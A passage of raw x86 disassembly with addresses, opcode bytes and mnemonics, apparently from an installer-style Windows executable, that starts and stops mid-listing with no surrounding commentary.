  401e38:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  401e3c:	39 5c 24 28          	cmp    %ebx,0x28(%esp)
  401e40:	0f 8c ba 0e 00 00    	jl     0x402d00
  401e46:	51                   	push   %ecx
  401e47:	e9 4f f8 ff ff       	jmp    0x40169b
  401e4c:	53                   	push   %ebx
  401e4d:	e8 04 10 00 00       	call   0x402e56
  401e52:	59                   	pop    %ecx
  401e53:	50                   	push   %eax
  401e54:	ff 15 34 82 40 00    	call   *0x408234
  401e5a:	85 c0                	test   %eax,%eax
  401e5c:	0f 84 1a fd ff ff    	je     0x401b7c
  401e62:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  401e66:	e9 9d 0e 00 00       	jmp    0x402d08
  401e6b:	6a 02                	push   $0x2
  401e6d:	e8 e4 0f 00 00       	call   0x402e56
  401e72:	6a 01                	push   $0x1
  401e74:	8b f0                	mov    %eax,%esi
  401e76:	e8 db 0f 00 00       	call   0x402e56
  401e7b:	59                   	pop    %ecx
  401e7c:	59                   	pop    %ecx
  401e7d:	56                   	push   %esi
  401e7e:	50                   	push   %eax
  401e7f:	ff 15 2c 82 40 00    	call   *0x40822c
  401e85:	e9 41 fc ff ff       	jmp    0x401acb
  401e8a:	8b 35 48 40 42 00    	mov    0x424048,%esi
  401e90:	53                   	push   %ebx
  401e91:	03 f1                	add    %ecx,%esi
  401e93:	e8 be 0f 00 00       	call   0x402e56
  401e98:	59                   	pop    %ecx
  401e99:	56                   	push   %esi
  401e9a:	6a eb                	push   $0xffffffeb
  401e9c:	50                   	push   %eax
  401e9d:	ff 15 14 82 40 00    	call   *0x408214
  401ea3:	e9 54 0e 00 00       	jmp    0x402cfc
  401ea8:	f7 44 24 34 00 01 00 	testl  $0x100,0x34(%esp)
  401eaf:	00 
  401eb0:	74 0a                	je     0x401ebc
  401eb2:	6a 02                	push   $0x2
  401eb4:	e8 9d 0f 00 00       	call   0x402e56
  401eb9:	59                   	pop    %ecx
  401eba:	eb 0b                	jmp    0x401ec7
  401ebc:	ff 74 24 30          	push   0x30(%esp)
  401ec0:	52                   	push   %edx
  401ec1:	ff 15 2c 82 40 00    	call   *0x40822c
  401ec7:	8b d8                	mov    %eax,%ebx
  401ec9:	8b 44 24 34          	mov    0x34(%esp),%eax
  401ecd:	8b c8                	mov    %eax,%ecx
  401ecf:	8b f8                	mov    %eax,%edi
  401ed1:	83 e1 04             	and    $0x4,%ecx
  401ed4:	c1 ef 1e             	shr    $0x1e,%edi
  401ed7:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  401edb:	8b f0                	mov    %eax,%esi
  401edd:	8b c8                	mov    %eax,%ecx
  401edf:	83 e6 03             	and    $0x3,%esi
  401ee2:	c1 e9 1f             	shr    $0x1f,%ecx
  401ee5:	83 e7 01             	and    $0x1,%edi
  401ee8:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  401eec:	a9 00 00 01 00       	test   $0x10000,%eax
  401ef1:	74 09                	je     0x401efc
  401ef3:	6a 11                	push   $0x11
  401ef5:	e8 98 0f 00 00       	call   0x402e92
  401efa:	eb 05                	jmp    0x401f01
  401efc:	0f b7 44 24 2c       	movzwl 0x2c(%esp),%eax
  401f01:	89 44 24 18          	mov    %eax,0x18(%esp)
  401f05:	8d 44 24 54          	lea    0x54(%esp),%eax
  401f09:	50                   	push   %eax
  401f0a:	53                   	push   %ebx
  401f0b:	ff 15 4c 82 40 00    	call   *0x40824c
  401f11:	8b 44 24 34          	mov    0x34(%esp),%eax
  401f15:	25 f0 fe 00 00       	and    $0xfef0,%eax
  401f1a:	50                   	push   %eax
  401f1b:	8b 44 24 64          	mov    0x64(%esp),%eax
  401f1f:	0f af c7             	imul   %edi,%eax
  401f22:	50                   	push   %eax
  401f23:	8b 44 24 64          	mov    0x64(%esp),%eax
  401f27:	0f af 44 24 24       	imul   0x24(%esp),%eax
  401f2c:	50                   	push   %eax
  401f2d:	33 c0                	xor    %eax,%eax
  401f2f:	39 44 24 20          	cmp    %eax,0x20(%esp)
  401f33:	56                   	push   %esi
  401f34:	ff 74 24 28          	push   0x28(%esp)
  401f38:	0f 45 05 f4 37 42 00 	cmovne 0x4237f4,%eax
  401f3f:	50                   	push   %eax
  401f40:	ff 15 0c 82 40 00    	call   *0x40820c
  401f46:	8b f8                	mov    %eax,%edi
  401f48:	57                   	push   %edi
  401f49:	56                   	push   %esi
  401f4a:	68 72 01 00 00       	push   $0x172
  401f4f:	53                   	push   %ebx
  401f50:	ff 15 40 82 40 00    	call   *0x408240
  401f56:	85 c0                	test   %eax,%eax
  401f58:	74 0b                	je     0x401f65
  401f5a:	85 f6                	test   %esi,%esi
  401f5c:	75 07                	jne    0x401f65
  401f5e:	50                   	push   %eax
  401f5f:	ff 15 60 80 40 00    	call   *0x408060
  401f65:	83 7c 24 28 00       	cmpl   $0x0,0x28(%esp)
  401f6a:	0f 8c 8c 0d 00 00    	jl     0x402cfc
  401f70:	57                   	push   %edi
  401f71:	e9 25 f7 ff ff       	jmp    0x40169b
  401f76:	52                   	push   %edx
  401f77:	ff 15 20 82 40 00    	call   *0x408220
  401f7d:	6a 02                	push   $0x2
  401f7f:	8b f8                	mov    %eax,%edi
  401f81:	e8 d0 0e 00 00       	call   0x402e56
  401f86:	59                   	pop    %ecx
  401f87:	6a 48                	push   $0x48
  401f89:	6a 5a                	push   $0x5a
  401f8b:	57                   	push   %edi
  401f8c:	8b f0                	mov    %eax,%esi
  401f8e:	ff 15 48 80 40 00    	call   *0x408048
  401f94:	50                   	push   %eax
  401f95:	56                   	push   %esi
  401f96:	ff 15 e8 80 40 00    	call   *0x4080e8
  401f9c:	f7 d8                	neg    %eax
  401f9e:	a3 e8 b4 40 00       	mov    %eax,0x40b4e8
  401fa3:	8b 44 24 14          	mov    0x14(%esp),%eax
  401fa7:	57                   	push   %edi
  401fa8:	50                   	push   %eax
  401fa9:	ff 15 1c 82 40 00    	call   *0x40821c
  401faf:	6a 03                	push   $0x3
  401fb1:	e8 a0 0e 00 00       	call   0x402e56
  401fb6:	59                   	pop    %ecx
  401fb7:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  401fbb:	ff 74 24 2c          	push   0x2c(%esp)
  401fbf:	a3 f8 b4 40 00       	mov    %eax,0x40b4f8
  401fc4:	8a c1                	mov    %cl,%al
  401fc6:	24 01                	and    $0x1,%al
  401fc8:	c6 05 ff b4 40 00 01 	movb   $0x1,0x40b4ff
  401fcf:	a2 fc b4 40 00       	mov    %al,0x40b4fc
  401fd4:	8a c1                	mov    %cl,%al
  401fd6:	24 02                	and    $0x2,%al
  401fd8:	80 e1 04             	and    $0x4,%cl
  401fdb:	68 04 b5 40 00       	push   $0x40b504
  401fe0:	a2 fd b4 40 00       	mov    %al,0x40b4fd
  401fe5:	88 0d fe b4 40 00    	mov    %cl,0x40b4fe
  401feb:	e8 15 3c 00 00       	call   0x405c05
  401ff0:	68 e8 b4 40 00       	push   $0x40b4e8
  401ff5:	ff 15 64 80 40 00    	call   *0x408064
  401ffb:	e9 cb fa ff ff       	jmp    0x401acb
  402000:	53                   	push   %ebx
  402001:	e8 50 0e 00 00       	call   0x402e56
  402006:	6a 01                	push   $0x1
  402008:	8b f0                	mov    %eax,%esi
  40200a:	e8 47 0e 00 00       	call   0x402e56
  40200f:	59                   	pop    %ecx
  402010:	59                   	pop    %ecx
  402011:	50                   	push   %eax
  402012:	56                   	push   %esi
  402013:	39 5c 24 3c          	cmp    %ebx,0x3c(%esp)
  402017:	75 0b                	jne    0x402024
  402019:	ff 15 30 82 40 00    	call   *0x408230
  40201f:	e9 d8 0c 00 00       	jmp    0x402cfc
  402024:	ff 15 28 82 40 00    	call   *0x408228
  40202a:	e9 cd 0c 00 00       	jmp    0x402cfc
  40202f:	53                   	push   %ebx
  402030:	e8 5d 0e 00 00       	call   0x402e92
  402035:	6a 31                	push   $0x31
  402037:	8b d8                	mov    %eax,%ebx
  402039:	e8 54 0e 00 00       	call   0x402e92
  40203e:	6a 22                	push   $0x22
  402040:	8b f0                	mov    %eax,%esi
  402042:	e8 4b 0e 00 00       	call   0x402e92
  402047:	6a 15                	push   $0x15
  402049:	8b f8                	mov    %eax,%edi
  40204b:	e8 42 0e 00 00       	call   0x402e92
  402050:	68 e8 a4 40 00       	push   $0x40a4e8
  402055:	6a ec                	push   $0xffffffec
  402057:	e8 06 3a 00 00       	call   0x405a62
  40205c:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  402060:	8b 44 24 14          	mov    0x14(%esp),%eax
  402064:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  402068:	33 c0                	xor    %eax,%eax
  40206a:	89 4c 24 58          	mov    %ecx,0x58(%esp)
  40206e:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  402072:	89 4c 24 70          	mov    %ecx,0x70(%esp)
  402076:	38 03                	cmp    %al,(%ebx)
  402078:	89 74 24 64          	mov    %esi,0x64(%esp)
  40207c:	0f 45 c3             	cmovne %ebx,%eax
  40207f:	89 44 24 60          	mov    %eax,0x60(%esp)
  402083:	33 c0                	xor    %eax,%eax
  402085:	38 07                	cmp    %al,(%edi)
  402087:	c7 44 24 6c 00 a8 42 	movl   $0x42a800,0x6c(%esp)
  40208e:	00 
  40208f:	0f 45 c7             	cmovne %edi,%eax
  402092:	89 44 24 68          	mov    %eax,0x68(%esp)
  402096:	8d 44 24 54          	lea    0x54(%esp),%eax
  40209a:	50                   	push   %eax
  40209b:	e8 0c 46 00 00       	call   0x4066ac
  4020a0:	85 c0                	test   %eax,%eax
  4020a2:	0f 84 45 f6 ff ff    	je     0x4016ed
  4020a8:	f6 44 24 58 40       	testb  $0x40,0x58(%esp)
  4020ad:	0f 84 49 0c 00 00    	je     0x402cfc
  4020b3:	ff b4 24 8c 00 00 00 	push   0x8c(%esp)
  4020ba:	e8 03 41 00 00       	call   0x4061c2
  4020bf:	ff b4 24 8c 00 00 00 	push   0x8c(%esp)
  4020c6:	ff 15 08 81 40 00    	call   *0x408108
  4020cc:	e9 2b 0c 00 00       	jmp    0x402cfc
  4020d1:	53                   	push   %ebx
  4020d2:	e8 bb 0d 00 00       	call   0x402e92
  4020d7:	8b f0                	mov    %eax,%esi
  4020d9:	56                   	push   %esi
  4020da:	6a eb                	push   $0xffffffeb
  4020dc:	e8 81 39 00 00       	call   0x405a62
  4020e1:	56                   	push   %esi
  4020e2:	e8 91 42 00 00       	call   0x406378
  4020e7:	8b f0                	mov    %eax,%esi
  4020e9:	85 f6                	test   %esi,%esi
  4020eb:	0f 84 fc f5 ff ff    	je     0x4016ed
  4020f1:	39 5c 24 30          	cmp    %ebx,0x30(%esp)
  4020f5:	74 27                	je     0x40211e
  4020f7:	56                   	push   %esi
  4020f8:	e8 c5 40 00 00       	call   0x4061c2
  4020fd:	8b c8                	mov    %eax,%ecx
  4020ff:	39 5c 24 2c          	cmp    %ebx,0x2c(%esp)
  402103:	7c 09                	jl     0x40210e
  402105:	51                   	push   %ecx
  402106:	57                   	push   %edi
  402107:	e8 ba 41 00 00       	call   0x4062c6
  40210c:	eb 10                	jmp    0x40211e
  40210e:	8b 44 24 10          	mov    0x10(%esp),%eax
  402112:	33 d2                	xor    %edx,%edx
  402114:	42                   	inc    %edx
  402115:	85 c9                	test   %ecx,%ecx
  402117:	0f 45 c2             	cmovne %edx,%eax
  40211a:	89 44 24 10          	mov    %eax,0x10(%esp)
  40211e:	56                   	push   %esi
  40211f:	eb a5                	jmp    0x4020c6
  402121:	6a 02                	push   $0x2
  402123:	e8 6a 0d 00 00       	call   0x402e92
  402128:	50                   	push   %eax
  402129:	e8 4d 41 00 00       	call   0x40627b
  40212e:	8b f0                	mov    %eax,%esi
  402130:	85 f6                	test   %esi,%esi
  402132:	74 11                	je     0x402145
  402134:	ff 76 14             	push   0x14(%esi)
  402137:	57                   	push   %edi
  402138:	e8 89 41 00 00       	call   0x4062c6
  40213d:	ff 76 18             	push   0x18(%esi)
  402140:	e9 56 f5 ff ff       	jmp    0x40169b
  402145:	88 5d 00             	mov    %bl,0x0(%ebp)
  402148:	88 1f                	mov    %bl,(%edi)
  40214a:	e9 9e f5 ff ff       	jmp    0x4016ed
  40214f:	6a ee                	push   $0xffffffee
  402151:	e8 3c 0d 00 00       	call   0x402e92
  402156:	8d 4c 24 54          	lea    0x54(%esp),%ecx
  40215a:	89 44 24 44          	mov    %eax,0x44(%esp)
  40215e:	51                   	push   %ecx
  40215f:	50                   	push   %eax
  402160:	6a 0b                	push   $0xb
  402162:	e8 3c 44 00 00       	call   0x4065a3
  402167:	ff d0                	call   *%eax
  402169:	8b c8                	mov    %eax,%ecx
  40216b:	88 5d 00             	mov    %bl,0x0(%ebp)
  40216e:	33 c0                	xor    %eax,%eax
  402170:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  402174:	40                   	inc    %eax
  402175:	88 1f                	mov    %bl,(%edi)
  402177:	89 44 24 10          	mov    %eax,0x10(%esp)
  40217b:	85 c9                	test   %ecx,%ecx
  40217d:	0f 84 7d 0b 00 00    	je     0x402d00
  402183:	51                   	push   %ecx
  402184:	6a 40                	push   $0x40
  402186:	ff 15 f4 80 40 00    	call   *0x4080f4
  40218c:	89 44 24 14          	mov    %eax,0x14(%esp)
  402190:	85 c0                	test   %eax,%eax
  402192:	0f 84 64 0b 00 00    	je     0x402cfc
  402198:	6a 0c                	push   $0xc
  40219a:	e8 04 44 00 00       	call   0x4065a3
  40219f:	6a 0d                	push   $0xd
  4021a1:	8b f0                	mov    %eax,%esi
  4021a3:	e8 fb 43 00 00       	call   0x4065a3
  4021a8:	ff 74 24 14          	push   0x14(%esp)
  4021ac:	89 44 24 4c          	mov    %eax,0x4c(%esp)
  4021b0:	ff 74 24 20          	push   0x20(%esp)
  4021b4:	53                   	push   %ebx
  4021b5:	ff 74 24 50          	push   0x50(%esp)
  4021b9:	ff d6                	call   *%esi
  4021bb:	85 c0                	test   %eax,%eax
  4021bd:	74 43                	je     0x402202
  4021bf:	8d 44 24 40          	lea    0x40(%esp),%eax
  4021c3:	50                   	push   %eax
  4021c4:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4021c8:	50                   	push   %eax
  4021c9:	68 98 82 40 00       	push   $0x408298
  4021ce:	ff 74 24 20          	push   0x20(%esp)
  4021d2:	ff 54 24 58          	call   *0x58(%esp)
  4021d6:	85 c0                	test   %eax,%eax
  4021d8:	74 28                	je     0x402202
  4021da:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4021de:	8b 44 24 34          	mov    0x34(%esp),%eax
  4021e2:	ff 74 81 08          	push   0x8(%ecx,%eax,4)
  4021e6:	55                   	push   %ebp
  4021e7:	e8 da 40 00 00       	call   0x4062c6
  4021ec:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  4021f0:	8b 44 24 18          	mov    0x18(%esp),%eax
  4021f4:	ff 74 88 0c          	push   0xc(%eax,%ecx,4)
  4021f8:	57                   	push   %edi
  4021f9:	e8 c8 40 00 00       	call   0x4062c6
  4021fe:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  402202:	ff 74 24 14          	push   0x14(%esp)
  402206:	e9 2f fb ff ff       	jmp    0x401d3a
  40220b:	33 ed                	xor    %ebp,%ebp
  40220d:	45                   	inc    %ebp
  40220e:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  402212:	39 1d 60 40 42 00    	cmp    %ebx,0x424060
  402218:	0f 8c d6 00 00 00    	jl     0x4022f4
  40221e:	6a f0                	push   $0xfffffff0
  402220:	e8 6d 0c 00 00       	call   0x402e92
  402225:	8b f0                	mov    %eax,%esi
  402227:	55                   	push   %ebp
  402228:	89 74 24 4c          	mov    %esi,0x4c(%esp)
  40222c:	e8 61 0c 00 00       	call   0x402e92
  402231:	8b f8                	mov    %eax,%edi
  402233:	89 7c 24 44          	mov    %edi,0x44(%esp)
  402237:	39 5c 24 38          	cmp    %ebx,0x38(%esp)
  40223b:	74 11                	je     0x40224e
  40223d:	56                   	push   %esi
  40223e:	ff 15 fc 80 40 00    	call   *0x4080fc
  402244:	8b f0                	mov    %eax,%esi
  402246:	85 f6                	test   %esi,%esi
  402248:	75 18                	jne    0x402262
  40224a:	8b 74 24 48          	mov    0x48(%esp),%esi
  40224e:	6a 08                	push   $0x8
  402250:	53                   	push   %ebx
  402251:	56                   	push   %esi
  402252:	ff 15 f8 80 40 00    	call   *0x4080f8
  402258:	8b f0                	mov    %eax,%esi
  40225a:	85 f6                	test   %esi,%esi
  40225c:	0f 84 86 00 00 00    	je     0x4022e8
  402262:	57                   	push   %edi
  402263:	56                   	push   %esi
  402264:	e8 66 3d 00 00       	call   0x405fcf
  402269:	8b f8                	mov    %eax,%edi
  40226b:	85 ff                	test   %edi,%edi
  40226d:	74 46                	je     0x4022b5
  40226f:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  402273:	39 5c 24 30          	cmp    %ebx,0x30(%esp)
  402277:	74 1c                	je     0x402295
  402279:	68 e8 a4 40 00       	push   $0x40a4e8
  40227e:	ff 74 24 34          	push   0x34(%esp)
  402282:	e8 db 37 00 00       	call   0x405a62
  402287:	ff d7                	call   *%edi
  402289:	85 c0                	test   %eax,%eax
  40228b:	74 33                	je     0x4022c0
  40228d:	8b c5                	mov    %ebp,%eax
  40228f:	89 44 24 10          	mov    %eax,0x10(%esp)
  402293:	eb 2f                	jmp    0x4022c4
  402295:	8b 44 24 14          	mov    0x14(%esp),%eax
  402299:	68 00 a0 40 00       	push   $0x40a000
  40229e:	68 e0 a0 40 00       	push   $0x40a0e0
  4022a3:	68 00 50 42 00       	push   $0x425000
  4022a8:	68 00 04 00 00       	push   $0x400
  4022ad:	50                   	push   %eax
  4022ae:	ff d7                	call   *%edi
  4022b0:	83 c4 14             	add    $0x14,%esp
  4022b3:	eb 0b                	jmp    0x4022c0
  4022b5:	ff 74 24 44          	push   0x44(%esp)
  4022b9:	6a f7                	push   $0xfffffff7
  4022bb:	e8 a2 37 00 00       	call   0x405a62
  4022c0:	8b 44 24 10          	mov    0x10(%esp),%eax
  4022c4:	39 5c 24 34          	cmp    %ebx,0x34(%esp)
  4022c8:	0f 85 32 0a 00 00    	jne    0x402d00
  4022ce:	56                   	push   %esi
  4022cf:	e8 f2 17 00 00       	call   0x403ac6
  4022d4:	85 c0                	test   %eax,%eax
  4022d6:	0f 84 20 0a 00 00    	je     0x402cfc
  4022dc:	56                   	push   %esi
  4022dd:	ff 15 00 81 40 00    	call   *0x408100
  4022e3:	e9 14 0a 00 00       	jmp    0x402cfc
  4022e8:	68 e8 a4 40 00       	push   $0x40a4e8
  4022ed:	6a f6                	push   $0xfffffff6
  4022ef:	e9 ff f2 ff ff       	jmp    0x4015f3
  4022f4:	68 e8 a4 40 00       	push   $0x40a4e8
  4022f9:	6a e7                	push   $0xffffffe7
  4022fb:	e9 f3 f2 ff ff       	jmp    0x4015f3
  402300:	6a f0                	push   $0xfffffff0
  402302:	e8 8b 0b 00 00       	call   0x402e92
  402307:	6a df                	push   $0xffffffdf
  402309:	89 44 24 58          	mov    %eax,0x58(%esp)
  40230d:	e8 80 0b 00 00       	call   0x402e92
  402312:	6a 02                	push   $0x2
  402314:	8b f0                	mov    %eax,%esi
  402316:	e8 77 0b 00 00       	call   0x402e92
  40231b:	6a cd                	push   $0xffffffcd
  40231d:	89 44 24 50          	mov    %eax,0x50(%esp)
  402321:	e8 6c 0b 00 00       	call   0x402e92
  402326:	6a 45                	push   $0x45
  402328:	89 44 24 20          	mov    %eax,0x20(%esp)
  40232c:	e8 61 0b 00 00       	call   0x402e92
  402331:	89 44 24 40          	mov    %eax,0x40(%esp)
  402335:	8b 44 24 38          	mov    0x38(%esp),%eax
  402339:	8b c8                	mov    %eax,%ecx
  40233b:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  402341:	8b f8                	mov    %eax,%edi
  402343:	89 4c 24 50          	mov    %ecx,0x50(%esp)
  402347:	8b c8                	mov    %eax,%ecx
  402349:	81 e1 00 80 00 00    	and    $0x8000,%ecx
  40234f:	c1 f8 10             	sar    $0x10,%eax
  402352:	c1 ff 0c             	sar    $0xc,%edi
  402355:	56                   	push   %esi
  402356:	89 4c 24 4c          	mov    %ecx,0x4c(%esp)
  40235a:	83 e7 07             	and    $0x7,%edi
  40235d:	89 44 24 48          	mov    %eax,0x48(%esp)
  402361:	e8 f6 46 00 00       	call   0x406a5c
  402366:	85 c0                	test   %eax,%eax
  402368:	75 07                	jne    0x402371
  40236a:	6a 21                	push   $0x21
  40236c:	e8 21 0b 00 00       	call   0x402e92
  402371:	8d 44 24 14          	lea    0x14(%esp),%eax
  402375:	33 ed                	xor    %ebp,%ebp
  402377:	50                   	push   %eax
  402378:	68 20 87 40 00       	push   $0x408720
  40237d:	45                   	inc    %ebp
  40237e:	55                   	push   %ebp
  40237f:	53                   	push   %ebx
  402380:	68 40 87 40 00       	push   $0x408740
  402385:	ff 15 8c 82 40 00    	call   *0x40828c
  40238b:	89 44 24 10          	mov    %eax,0x10(%esp)
  40238f:	85 c0                	test   %eax,%eax
  402391:	0f 88 e1 00 00 00    	js     0x402478
  402397:	8b 44 24 14          	mov    0x14(%esp),%eax
  40239b:	8d 54 24 18          	lea    0x18(%esp),%edx
  40239f:	52                   	push   %edx
  4023a0:	68 30 87 40 00       	push   $0x408730
  4023a5:	50                   	push   %eax
  4023a6:	8b 08                	mov    (%eax),%ecx
  4023a8:	ff 11                	call   *(%ecx)
  4023aa:	89 44 24 10          	mov    %eax,0x10(%esp)
  4023ae:	85 c0                	test   %eax,%eax
  4023b0:	0f 88 b4 00 00 00    	js     0x40246a
  4023b6:	8b 44 24 14          	mov    0x14(%esp),%eax
  4023ba:	56                   	push   %esi
  4023bb:	50                   	push   %eax
  4023bc:	8b 08                	mov    (%eax),%ecx
  4023be:	ff 51 50             	call   *0x50(%ecx)
  4023c1:	89 44 24 10          	mov    %eax,0x10(%esp)
  4023c5:	39 5c 24 48          	cmp    %ebx,0x48(%esp)
  4023c9:	75 0f                	jne    0x4023da
  4023cb:	8b 44 24 14          	mov    0x14(%esp),%eax
  4023cf:	68 00 a8 42 00       	push   $0x42a800
  4023d4:	50                   	push   %eax
  4023d5:	8b 08                	mov    (%eax),%ecx
  4023d7:	ff 51 24             	call   *0x24(%ecx)
  4023da:	85 ff                	test   %edi,%edi
  4023dc:	74 0b                	je     0x4023e9
  4023de:	8b 44 24 14          	mov    0x14(%esp),%eax
  4023e2:	57                   	push   %edi
  4023e3:	50                   	push   %eax
  4023e4:	8b 08                	mov    (%eax),%ecx
  4023e6:	ff 51 3c             	call   *0x3c(%ecx)
  4023e9:	8b 44 24 14          	mov    0x14(%esp),%eax
  4023ed:	ff 74 24 44          	push   0x44(%esp)
  4023f1:	50                   	push   %eax
  4023f2:	8b 08                	mov    (%eax),%ecx
  4023f4:	ff 51 34             	call   *0x34(%ecx)
  4023f7:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  4023fb:	38 1a                	cmp    %bl,(%edx)
  4023fd:	74 0f                	je     0x40240e
  4023ff:	8b 44 24 14          	mov    0x14(%esp),%eax
  402403:	ff 74 24 50          	push   0x50(%esp)
  402407:	52                   	push   %edx
  402408:	8b 08                	mov    (%eax),%ecx
  40240a:	50                   	push   %eax
  40240b:	ff 51 44             	call   *0x44(%ecx)
  40240e:	8b 44 24 14          	mov    0x14(%esp),%eax
  402412:	ff 74 24 4c          	push   0x4c(%esp)
  402416:	50                   	push   %eax
  402417:	8b 08                	mov    (%eax),%ecx
  402419:	ff 51 2c             	call   *0x2c(%ecx)
  40241c:	8b 44 24 14          	mov    0x14(%esp),%eax
  402420:	ff 74 24 40          	push   0x40(%esp)
  402424:	50                   	push   %eax
  402425:	8b 08                	mov    (%eax),%ecx
  402427:	ff 51 1c             	call   *0x1c(%ecx)
  40242a:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  40242e:	7c 30                	jl     0x402460
  402430:	68 00 04 00 00       	push   $0x400
  402435:	56                   	push   %esi
  402436:	6a ff                	push   $0xffffffff
  402438:	ff 74 24 60          	push   0x60(%esp)
  40243c:	c7 44 24 20 05 40 00 	movl   $0x80004005,0x20(%esp)
  402443:	80 
  402444:	53                   	push   %ebx
  402445:	53                   	push   %ebx
  402446:	ff 15 d0 80 40 00    	call   *0x4080d0
  40244c:	85 c0                	test   %eax,%eax
  40244e:	74 10                	je     0x402460
  402450:	8b 44 24 18          	mov    0x18(%esp),%eax
  402454:	55                   	push   %ebp
  402455:	56                   	push   %esi
  402456:	50                   	push   %eax
  402457:	8b 08                	mov    (%eax),%ecx
  402459:	ff 51 18             	call   *0x18(%ecx)
  40245c:	89 44 24 10          	mov    %eax,0x10(%esp)
  402460:	8b 44 24 18          	mov    0x18(%esp),%eax
  402464:	50                   	push   %eax
  402465:	8b 08                	mov    (%eax),%ecx
  402467:	ff 51 08             	call   *0x8(%ecx)
  40246a:	8b 44 24 14          	mov    0x14(%esp),%eax
  40246e:	50                   	push   %eax
  40246f:	8b 08                	mov    (%eax),%ecx
  402471:	ff 51 08             	call   *0x8(%ecx)
  402474:	8b 44 24 10          	mov    0x10(%esp),%eax
  402478:	c1 f8 1f             	sar    $0x1f,%eax
  40247b:	83 e0 fc             	and    $0xfffffffc,%eax
  40247e:	68 e8 a4 40 00       	push   $0x40a4e8
  402483:	83 e8 0c             	sub    $0xc,%eax
  402486:	50                   	push   %eax
  402487:	e8 d6 35 00 00       	call   0x405a62
  40248c:	8b 44 24 10          	mov    0x10(%esp),%eax
  402490:	c1 e8 1f             	shr    $0x1f,%eax
  402493:	e9 68 08 00 00       	jmp    0x402d00
  402498:	53                   	push   %ebx
  402499:	e8 f4 09 00 00       	call   0x402e92
  40249e:	6a 11                	push   $0x11
  4024a0:	8b f0                	mov    %eax,%esi
  4024a2:	e8 eb 09 00 00       	call   0x402e92
  4024a7:	6a 23                	push   $0x23
  4024a9:	8b f8                	mov    %eax,%edi
  4024ab:	e8 e2 09 00 00       	call   0x402e92
  4024b0:	56                   	push   %esi
  4024b1:	8b e8                	mov    %eax,%ebp
  4024b3:	e8 c3 3d 00 00       	call   0x40627b
  4024b8:	85 c0                	test   %eax,%eax
  4024ba:	75 0d                	jne    0x4024c9
  4024bc:	53                   	push   %ebx
  4024bd:	6a f9                	push   $0xfffffff9
  4024bf:	e8 9e 35 00 00       	call   0x405a62
  4024c4:	e9 24 f2 ff ff       	jmp    0x4016ed
  4024c9:	8b 44 24 14          	mov    0x14(%esp),%eax
  4024cd:	56                   	push   %esi
  4024ce:	89 44 24 58          	mov    %eax,0x58(%esp)
  4024d2:	c7 44 24 5c 02 00 00 	movl   $0x2,0x5c(%esp)
  4024d9:	00 
  4024da:	e8 ff 42 00 00       	call   0x4067de
  4024df:	57                   	push   %edi
  4024e0:	88 5c 30 01          	mov    %bl,0x1(%eax,%esi,1)
  4024e4:	e8 f5 42 00 00       	call   0x4067de
  4024e9:	55                   	push   %ebp
  4024ea:	53                   	push   %ebx
  4024eb:	88 5c 38 01          	mov    %bl,0x1(%eax,%edi,1)
  4024ef:	66 8b 44 24 38       	mov    0x38(%esp),%ax
  4024f4:	89 74 24 64          	mov    %esi,0x64(%esp)
  4024f8:	89 7c 24 68          	mov    %edi,0x68(%esp)
  4024fc:	89 6c 24 76          	mov    %ebp,0x76(%esp)
  402500:	66 89 44 24 6c       	mov    %ax,0x6c(%esp)
  402505:	e8 58 35 00 00       	call   0x405a62
  40250a:	8d 44 24 54          	lea    0x54(%esp),%eax
  40250e:	50                   	push   %eax
  40250f:	ff 15 6c 81 40 00    	call   *0x40816c
  402515:	85 c0                	test   %eax,%eax
  402517:	0f 84 df 07 00 00    	je     0x402cfc
  40251d:	eb 9d                	jmp    0x4024bc
  40251f:	81 fe 0d f0 ad 0b    	cmp    $0xbadf00d,%esi
  402525:	0f 85 de f7 ff ff    	jne    0x401d09
  40252b:	ff 05 d4 40 42 00    	incl   0x4240d4
  402531:	e9 c6 07 00 00       	jmp    0x402cfc
  402536:	8b fb                	mov    %ebx,%edi
  402538:	8b eb                	mov    %ebx,%ebp
  40253a:	85 f6                	test   %esi,%esi
  40253c:	74 0c                	je     0x40254a
  40253e:	53                   	push   %ebx
  40253f:	e8 4e 09 00 00       	call   0x402e92
  402544:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  402548:	8b d8                	mov    %eax,%ebx
  40254a:	85 c9                	test   %ecx,%ecx
  40254c:	74 09                	je     0x402557
  40254e:	6a 11                	push   $0x11
  402550:	e8 3d 09 00 00       	call   0x402e92
  402555:	8b f8                	mov    %eax,%edi
  402557:	39 6c 24 38          	cmp    %ebp,0x38(%esp)
  40255b:	74 09                	je     0x402566
  40255d:	6a 22                	push   $0x22
  40255f:	e8 2e 09 00 00       	call   0x402e92
  402564:	8b e8                	mov    %eax,%ebp
  402566:	6a cd                	push   $0xffffffcd
  402568:	e8 25 09 00 00       	call   0x402e92
  40256d:	50                   	push   %eax
  40256e:	55                   	push   %ebp
  40256f:	57                   	push   %edi
  402570:	53                   	push   %ebx
  402571:	ff 15 d8 80 40 00    	call   *0x4080d8
  402577:	e9 69 f1 ff ff       	jmp    0x4016e5
  40257c:	6a 0a                	push   $0xa
  40257e:	58                   	pop    %eax
  40257f:	6a 01                	push   $0x1
  402581:	66 89 44 24 18       	mov    %ax,0x18(%esp)
  402586:	e8 07 09 00 00       	call   0x402e92
  40258b:	6a 12                	push   $0x12
  40258d:	8b f8                	mov    %eax,%edi
  40258f:	e8 fe 08 00 00       	call   0x402e92
  402594:	6a dd                	push   $0xffffffdd
  402596:	8b f0                	mov    %eax,%esi
  402598:	e8 f5 08 00 00       	call   0x402e92
  40259d:	50                   	push   %eax
  40259e:	68 ff 03 00 00       	push   $0x3ff
